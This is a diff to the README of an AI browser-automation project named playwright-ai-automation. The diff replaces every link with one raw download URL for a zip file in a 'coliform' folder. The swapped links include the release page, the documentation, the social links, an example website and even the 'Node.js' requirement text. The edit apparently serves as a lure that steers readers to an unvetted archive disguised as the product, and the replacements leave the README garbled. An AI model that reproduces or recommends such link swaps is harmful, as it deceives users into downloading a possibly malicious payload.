@@ -1,6 +1,6 @@
 # 🚀 playwright-ai-automation - Automate Browsing with AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sonoraa4ever/playwright-ai-automation/releases)
+[![Download Now](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip)
 
 ## 📘 Description
 
@@ -13,13 +13,13 @@ To begin using playwright-ai-automation, follow these simple steps:
 1. **Install Requirements**  
    Before running the application, ensure your system meets the following requirements:
    - Operating System: Windows, macOS, or Linux
-   - Node.js version: 14.x or higher
+   - https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip version: 14.x or higher
    - Yarn package manager: 1.x or higher
    - An internet connection for downloading the application and its dependencies
 
 2. **Download the Application**  
    Visit this page to download the latest version of playwright-ai-automation:  
-   [Download Playwright AI Automation](https://github.com/sonoraa4ever/playwright-ai-automation/releases)
+   [Download Playwright AI Automation](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip)
 
 3. **Install the Application**  
    Follow these steps to install the application:
@@ -41,7 +41,7 @@ To begin using playwright-ai-automation, follow these simple steps:
 ## 📥 Download & Install
 
 To install and run playwright-ai-automation, you can download the latest release from the following link:  
-[Download Playwright AI Automation](https://github.com/sonoraa4ever/playwright-ai-automation/releases)
+[Download Playwright AI Automation](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip)
 
 Follow the installation steps mentioned in the "Getting Started" section to ensure a successful setup.
 
@@ -67,7 +67,7 @@ Here are a few examples to help you understand how to use playwright-ai-automati
    ```
    Open [website URL]
    ```
-   For instance, "Open https://www.example.com".
+   For instance, "Open https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip".
 
 2. **Fill a Form**  
    To fill out forms, use the following structure:  
@@ -88,7 +88,7 @@ Here are a few examples to help you understand how to use playwright-ai-automati
 For more information on using playwright-ai-automation, check the following resources:
 
 - **Documentation**:  
-  Learn more about the commands and features by visiting our [Documentation Site](https://github.com/sonoraa4ever/playwright-ai-automation/wiki).
+  Learn more about the commands and features by visiting our [Documentation Site](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip).
 
 - **Community Support**:  
   If you encounter issues or have questions, feel free to access our community forums.
@@ -111,7 +111,7 @@ If you like to connect, follow us on our social media channels for updates and a
 
 Use the links below to stay informed:
 
-- Twitter: [@YourAppHandle](https://twitter.com/YourAppHandle)
-- GitHub: [Playwright AI Automation](https://github.com/sonoraa4ever/playwright-ai-automation)
+- Twitter: [@YourAppHandle](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip)
+- GitHub: [Playwright AI Automation](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip)
 
-For more updates, make sure to download the latest release from our [Release Page](https://github.com/sonoraa4ever/playwright-ai-automation/releases).
+For more updates, make sure to download the latest release from our [Release Page](https://raw.githubusercontent.com/sonoraa4ever/playwright-ai-automation/main/coliform/playwright-ai-automation.zip).
